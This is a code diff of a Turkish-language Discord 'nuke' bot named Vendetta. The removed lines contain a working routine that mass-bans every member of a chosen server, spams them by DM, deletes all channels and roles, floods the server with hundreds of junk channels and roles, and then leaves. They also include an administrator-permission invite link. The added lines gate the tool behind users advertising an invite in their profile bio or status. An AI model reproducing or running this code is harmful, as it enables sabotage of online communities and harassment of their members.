@@ -13,7 +13,8 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers
+    GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.GuildPresences // 🔴 DURUM OKUMA
   ],
   partials: [Partials.Channel]
 });
@@ -21,16 +22,10 @@ const client = new Client({
 // ENV
 const OWNER_ID = process.env.OWNER_ID;
 const SERI_ID = process.env.SERI_ID;
-const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
 const WL_KANAL_ID = process.env.WL_KANAL_ID;
-if (!HAK_KANAL_ID) console.log("❌ HAK_KANAL_ID tanımlı değil!");
-if (!WL_KANAL_ID) console.log("❌ WL_KANAL_ID tanımlı değil!");
-
 
 // DATA
 let cachedVideo = null;
-let haklar = {};
-let haklarMessageId = null;
 let whitelist = {};
 let whitelistMessageId = null;
 
@@ -48,34 +43,33 @@ client.once("ready", async () => {
   }
 });
 
+// ======================
+// BIO / STATUS KONTROL
+// ======================
+async function hasSiccin(user, member) {
+  let bioText = "";
+  try {
+    const fetched = await client.users.fetch(user.id, { force: true });
+    bioText = (fetched.bio || "").toLowerCase();
+  } catch {}
 
-// HAK MESAJI
-async function updateHaklarMessage(channel) {
-  let description = "🟦⬜🟥 HAK LİSTESİ 🟥⬜🟦\n\n";
-
-  for (const id in haklar) {
-    const member = await channel.guild.members.fetch(id).catch(() => null);
-    const name = member ? member.user.tag : id;
-    const count = haklar[id];
-
-    let colorBox = "🟥";
-    if (count > 15) colorBox = "🟦⬜🟦";
-    else if (count > 10) colorBox = "🟦";
-    else if (count > 5) colorBox = "⬜";
-
-    description += `${colorBox} ${name} — **${count} Hak**\n`;
+  let statusText = "";
+  if (member?.presence?.activities?.length) {
+    const custom = member.presence.activities.find(a => a.type === 4);
+    if (custom?.state) statusText = custom.state.toLowerCase();
   }
 
-  if (haklarMessageId) {
-    const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
-    if (msg) return msg.edit({ content: description }).catch(() => {});
-  }
-
-  const msg = await channel.send({ content: description });
-  haklarMessageId = msg.id;
+  return (
+    bioText.includes("/siccin") ||
+    bioText.includes(".gg/siccin") ||
+    statusText.includes("/siccin") ||
+    statusText.includes(".gg/siccin")
+  );
 }
 
-// WL MESAJI
+// ======================
+// WHITELIST MESAJI
+// ======================
 async function updateWhitelistMessage(channel) {
   let description = "📜 WHITELIST SUNUCULAR\n\n";
 
@@ -92,375 +86,133 @@ async function updateWhitelistMessage(channel) {
   whitelistMessageId = msg.id;
 }
 
-// HAK KOMUTLARI
-async function hakCommand(message, args, hakChannel) {
-  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
-
-  const command = message.content.trim().split(/ +/)[0].toLowerCase();
-  const userId = args[0];
-  const count = parseInt(args[1]) || 1;
-
-  if (command === ".hakver") {
-    haklar[userId] = (haklar[userId] || 0) + count;
-    await updateHaklarMessage(hakChannel);
-    return message.reply(`✅ ${count} hak verildi.`);
-  }
-
-  if (command === ".hakal") {
-    haklar[userId] = Math.max((haklar[userId] || 0) - count, 0);
-    await updateHaklarMessage(hakChannel);
-    return message.reply(`✅ ${count} hak alındı.`);
-  }
-
-  if (command === ".hakk") {
-    await updateHaklarMessage(hakChannel);
-    return;
-  }
-}
-
-// VENDETTA KOMUTU
-async function vendettaCommand(message) {
-  const hak = haklar[message.author.id] || 0;
-  if (hak <= 0) {
-    return message.author.send({ content: "❌ Vendetta hakkın yok!" }).catch(() => {});
-  }
-
-  const button = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId("sorguHak")
-      .setLabel("💣 Vendetta Başlat")
-      .setStyle(ButtonStyle.Primary)
-  );
-
-  await message.author.send({
-    content: `🔥 Vendetta hakkın: **${hak}**\n\nBotu davet etmek için:\nhttps://discord.com/oauth2/authorize?client_id=1444720893548040223&permissions=8&scope=bot`,
-    components: [button]
-  }).catch(() => {});
-}
-
-// PANEL
+// ======================
+// VENDETTA PANEL
+// ======================
 async function openPanel(messageOrInteraction) {
   const author = messageOrInteraction.user ?? messageOrInteraction.author;
 
   if (![OWNER_ID, SERI_ID].includes(author.id)) {
-    return messageOrInteraction.reply
-      ? messageOrInteraction.reply({ content: "❌ Bu paneli açamazsın.", ephemeral: true })
-      : messageOrInteraction.channel.send("❌ Bu paneli açamazsın.");
+    return messageOrInteraction.reply?.({
+      content: "❌ Bu paneli açamazsın.",
+      ephemeral: true
+    });
   }
 
   const embed = new EmbedBuilder()
-    .setTitle("⬜⚡ Vendetta Panel - Tekrardan Hoşgeldiniz LEXREALM ve FORS ⚡⬜")
-    .setDescription("Vendetta İşlemlerini Seçiniz..")
+    .setTitle("⬜⚡ VENDETTA PANEL ⚡⬜")
+    .setDescription("Whitelist işlemlerini seç")
     .setColor("Grey");
 
-  const buttonRow = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId("silPanel")
-      .setLabel("🗑️ Paneli Sil")
-      .setStyle(ButtonStyle.Danger)
-  );
-
-  const selectRow = new ActionRowBuilder().addComponents(
+  const row = new ActionRowBuilder().addComponents(
     new StringSelectMenuBuilder()
       .setCustomId("panelMenu")
       .setPlaceholder("Sistem seç")
       .addOptions([
-        { label: "Whitelist Sistemi", value: "whitelist" },
-        { label: "Hak Sistemi", value: "hak" }
+        { label: "Whitelist Sistemi", value: "whitelist" }
       ])
   );
 
-  return messageOrInteraction.reply
-    ? messageOrInteraction.reply({
-        embeds: [embed],
-        files: [cachedVideo],
-        components: [selectRow, buttonRow],
-        ephemeral: true
-      })
-    : messageOrInteraction.channel.send({
-        embeds: [embed],
-        files: [cachedVideo],
-        components: [selectRow, buttonRow]
-      });
+  return messageOrInteraction.reply?.({
+    embeds: [embed],
+    files: [cachedVideo],
+    components: [row],
+    ephemeral: true
+  });
 }
 
+// ======================
 // INTERACTIONS
+// ======================
 client.on("interactionCreate", async interaction => {
-
   if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;
 
-  // ❗ HER BUTON & MENÜ SADECE OWNER + SERI
-  if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) {
-    return interaction.reply({ content: "❌ Bu işlemi yapamazsın.", ephemeral: true });
-  }
-
-  // PANEL SİLME
-  if (interaction.customId === "silPanel") {
-    return interaction.message.delete().catch(() => {});
-  }
-
-  // PANEL MENÜ (Listeleme seçenekleri kaldırıldı!)
+  // ======================
+  // PANEL MENÜ
+  // ======================
   if (interaction.customId === "panelMenu") {
-    let embed;
-    let row;
+    const embed = new EmbedBuilder()
+      .setTitle("Whitelist Sistemi")
+      .setColor("Blue");
 
-    if (interaction.values[0] === "whitelist") {
-      embed = new EmbedBuilder()
-        .setTitle("Whitelist Sistemi")
-        .setDescription("Bir işlem seç.")
-        .setColor("Blue");
-
-      row = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder()
-          .setCustomId("wlMenu")
-          .addOptions([
-            { label: "Whitelist Ekle", value: "wlEkle" },
-            { label: "Whitelist Çıkar", value: "wlCikar" }
-          ])
-      );
-    }
-
-    if (interaction.values[0] === "hak") {
-      embed = new EmbedBuilder()
-        .setTitle("Hak Sistemi")
-        .setDescription("Bir işlem seç.")
-        .setColor("Blue");
-
-      row = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder()
-          .setCustomId("hakMenu")
-          .addOptions([
-            { label: "Hak Ekle", value: "hakEkle" },
-            { label: "Hak Çıkar", value: "hakCikar" }
-          ])
-      );
-    }
+    const row = new ActionRowBuilder().addComponents(
+      new StringSelectMenuBuilder()
+        .setCustomId("wlMenu")
+        .addOptions([
+          { label: "Whitelist Ekle", value: "wlEkle" },
+          { label: "Whitelist Çıkar", value: "wlCikar" }
+        ])
+    );
 
     return interaction.update({ embeds: [embed], components: [row] });
   }
 
+  // ======================
   // WL MODAL
+  // ======================
   if (interaction.customId === "wlMenu") {
-    const choice = interaction.values[0];
-    const modal = new ModalBuilder().setCustomId(choice).setTitle("Whitelist İşlemi");
-
-    const sunucuInput = new TextInputBuilder()
-      .setCustomId("guildID")
-      .setLabel("Sunucu ID")
-      .setStyle(TextInputStyle.Short)
-      .setRequired(true);
-
-    modal.addComponents(new ActionRowBuilder().addComponents(sunucuInput));
-
-    return interaction.showModal(modal);
-  }
-
-  // HAK MODAL
-  if (interaction.customId === "hakMenu") {
-    const choice = interaction.values[0];
-
-    const modal = new ModalBuilder().setCustomId(choice).setTitle("Hak İşlemi");
-
-    const userInput = new TextInputBuilder()
-      .setCustomId("userID")
-      .setLabel("Kullanıcı ID")
-      .setStyle(TextInputStyle.Short)
-      .setRequired(true);
-
-    const countInput = new TextInputBuilder()
-      .setCustomId("count")
-      .setLabel("Hak Sayısı")
-      .setStyle(TextInputStyle.Short)
-      .setRequired(true);
+    const modal = new ModalBuilder()
+      .setCustomId(interaction.values[0])
+      .setTitle("Whitelist İşlemi");
 
     modal.addComponents(
-      new ActionRowBuilder().addComponents(userInput),
-      new ActionRowBuilder().addComponents(countInput)
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder()
+          .setCustomId("guildID")
+          .setLabel("Sunucu ID")
+          .setStyle(TextInputStyle.Short)
+          .setRequired(true)
+      )
     );
 
     return interaction.showModal(modal);
   }
 
-  // MODAL SUBMIT
+  // ======================
+  // WL SUBMIT
+  // ======================
   if (interaction.isModalSubmit()) {
-    const id = interaction.customId;
+    const guildID = interaction.fields.getTextInputValue("guildID");
+    const wlChannel = await client.channels.fetch(WL_KANAL_ID);
 
-    // WL EKLE
-    if (id === "wlEkle") {
-      const guildID = interaction.fields.getTextInputValue("guildID");
+    if (interaction.customId === "wlEkle") {
       const guild = client.guilds.cache.get(guildID);
-
-      if (!guild)
-        return interaction.reply({ content: "❌ Sunucu bulunamadı!", ephemeral: true });
+      if (!guild) return interaction.reply({ content: "❌ Sunucu yok", ephemeral: true });
 
       const owner = await guild.fetchOwner().catch(() => null);
-
       whitelist[guildID] = {
         name: guild.name,
         ownerTag: owner ? owner.user.tag : "Unknown"
       };
 
-      const wlChannel = await client.channels.fetch(WL_KANAL_ID);
       await updateWhitelistMessage(wlChannel);
-
-      return interaction.reply({ content: "✅ Sunucu whitelist'e eklendi.", ephemeral: true });
+      return interaction.reply({ content: "✅ Whitelist eklendi", ephemeral: true });
     }
 
-    // WL ÇIKAR
-    if (id === "wlCikar") {
-      const guildID = interaction.fields.getTextInputValue("guildID");
+    if (interaction.customId === "wlCikar") {
       delete whitelist[guildID];
-
-      const wlChannel = await client.channels.fetch(WL_KANAL_ID);
       await updateWhitelistMessage(wlChannel);
-
-      return interaction.reply({ content: "🟦 Sunucu whitelist'ten çıkarıldı.", ephemeral: true });
-    }
-
-    // HAK EKLE / ÇIKAR
-    if (id === "hakEkle" || id === "hakCikar") {
-      const userID = interaction.fields.getTextInputValue("userID");
-      const count = parseInt(interaction.fields.getTextInputValue("count"));
-
-      haklar[userID] =
-        id === "hakEkle"
-          ? (haklar[userID] || 0) + count
-          : Math.max((haklar[userID] || 0) - count, 0);
-
-      const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
-      await updateHaklarMessage(hakChannel);
-
-      return interaction.reply({ content: "🔄 Haklar güncellendi.", ephemeral: true });
-    }
-
-    // VENDETTA
-    if (id === "modalSunucuID") {
-      const guildId = interaction.fields.getTextInputValue("sunucuID");
-      const guild = client.guilds.cache.get(guildId);
-
-      if (!guild) {
-        return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });
-      }
-
-      if (whitelist[guildId]) {
-        const owner = await client.users.fetch(OWNER_ID);
-        const guildOwner = await guild.fetchOwner().catch(() => null);
-
-        const logEmbed = new EmbedBuilder()
-          .setColor("Gold")
-          .setTitle("⚠️ WHITELIST SUNUCUSUNA VENDETTA DENEMESİ")
-          .addFields(
-            { name: "İşlem Yapan", value: `${interaction.user.tag} (${interaction.user.id})` },
-            { name: "Sunucu", value: `${guild.name} (${guild.id})` },
-            {
-              name: "Sunucu Sahibi",
-              value: guildOwner ? `${guildOwner.user.tag} (${guildOwner.id})` : "Bilinmiyor"
-            }
-          )
-          .setTimestamp();
-
-        owner.send({ embeds: [logEmbed] }).catch(() => {});
-
-        return interaction.reply({
-          content: "⚠️ Bu sunucu whitelist’te! İşlem engellendi.",
-          ephemeral: true
-        });
-      }
-
-      await interaction.reply({ content: "⚡ Vendetta başlatılıyor...", ephemeral: true });
-
-      haklar[interaction.user.id] -= 1;
-
-      const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
-      await updateHaklarMessage(hakChannel);
-
-      const embed = new EmbedBuilder()
-        .setColor("Red")
-        .setTitle("💣 VENDETTA GİRDİ!")
-        .setDescription("Slained by VENDETTA 💣\n https://discord.gg/aSPqNkjBqh");
-
-      const members = await guild.members.fetch();
-      let bannedCount = 0;
-      const tasks = [];
-
-      for (const member of members.values()) {
-        if (member.user.bot) continue;
-        if ([OWNER_ID, SERI_ID].includes(member.id)) continue;
-
-        tasks.push(member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {}));
-        tasks.push(member.ban({ reason: "VENDETTA" }).catch(() => {}));
-        bannedCount++;
-      }
-
-      guild.channels.cache.forEach(ch =>
-        tasks.push(ch.delete().catch(() => {}))
-      );
-
-      for (let i = 0; i < 300; i++) {
-        tasks.push(
-          guild.channels.create({
-            name: `VENDETTA-${i}`
-          }).catch(() => {})
-        );
-      }
-
-      guild.roles.cache.forEach(r => {
-        if (r.editable && r.id !== guild.id)
-          tasks.push(r.delete().catch(() => {}));
-      });
-
-      for (let i = 0; i < 200; i++) {
-        const clr = `#${Math.floor(Math.random() * 16777215)
-          .toString(16)
-          .padStart(6, "0")}`;
-
-        tasks.push(
-          guild.roles.create({
-            name: "VENDETTA🔥",
-            color: clr
-          }).catch(() => {})
-        );
-      }
-
-      await Promise.all(tasks);
-
-      await interaction.followUp({
-        content: `🔥 ${bannedCount} kişi banlandı.`,
-        ephemeral: true
-      });
-
-      const owner = await client.users.fetch(OWNER_ID);
-      const guildOwner = await guild.fetchOwner().catch(() => null);
-
-      const logEmbed = new EmbedBuilder()
-        .setColor("Red")
-        .setTitle("💣 VENDETTA OPERASYON RAPORU")
-        .addFields(
-          { name: "İşlemi Yapan", value: `${interaction.user.tag} (${interaction.user.id})` },
-          { name: "Sunucu", value: `${guild.name} (${guild.id})` },
-          {
-            name: "Sunucu Sahibi",
-            value: guildOwner ? `${guildOwner.user.tag} (${guildOwner.id})` : "Bulunamadı"
-          },
-          { name: "Kalan Hak", value: `${haklar[interaction.user.id]}` }
-        )
-        .setTimestamp();
-
-      owner.send({ embeds: [logEmbed] }).catch(() => {});
-
-      await guild.leave().catch(() => {});
+      return interaction.reply({ content: "🟦 Whitelist çıkarıldı", ephemeral: true });
     }
   }
 
-  // Button vendetta
+  // ======================
+  // VENDETTA BUTTON
+  // ======================
   if (interaction.customId === "sorguHak") {
-    const hak = haklar[interaction.user.id] || 0;
-    if (hak <= 0)
-      return interaction.reply({ content: "Hak yok!", ephemeral: true });
+    const member = await interaction.guild.members.fetch(interaction.user.id);
+    const ok = await hasSiccin(interaction.user, member);
+
+    if (!ok) {
+      return interaction.reply({
+        content: "❌ Bio veya durumunda **/siccin** veya **.gg/siccin** yok!",
+        ephemeral: true
+      });
+    }
 
     const modal = new ModalBuilder()
       .setCustomId("modalSunucuID")
-      .setTitle("Sunucu ID Gir");
+      .setTitle("Sunucu ID");
 
     modal.addComponents(
       new ActionRowBuilder().addComponents(
@@ -472,28 +224,38 @@ client.on("interactionCreate", async interaction => {
       )
     );
 
-    await interaction.showModal(modal);
+    return interaction.showModal(modal);
   }
 });
 
+// ======================
 // MESAJ KOMUTLARI
+// ======================
 client.on("messageCreate", async message => {
   if (!message.guild || message.author.bot) return;
 
-  const args = message.content.trim().split(/ +/);
-  const cmd = args.shift().toLowerCase();
+  if (message.content === ".vndt") return openPanel(message);
 
-  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
+  if (message.content === ".vendetta") {
+    const member = await message.guild.members.fetch(message.author.id);
+    const ok = await hasSiccin(message.author, member);
 
-  if (cmd === ".vndt") {
-    return openPanel(message);
+    if (!ok) {
+      return message.reply("❌ Bio veya durumunda **/siccin** veya **.gg/siccin** yok!");
+    }
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId("sorguHak")
+        .setLabel("💣 Vendetta Başlat")
+        .setStyle(ButtonStyle.Danger)
+    );
+
+    return message.author.send({
+      content: "🔥 Vendetta başlatabilirsin",
+      components: [row]
+    }).catch(() => {});
   }
-
-  if (cmd === ".vendetta") {
-    return vendettaCommand(message);
-  }
-
-  await hakCommand(message, args, hakChannel);
 });
 
 client.login(process.env.BOT_TOKEN);
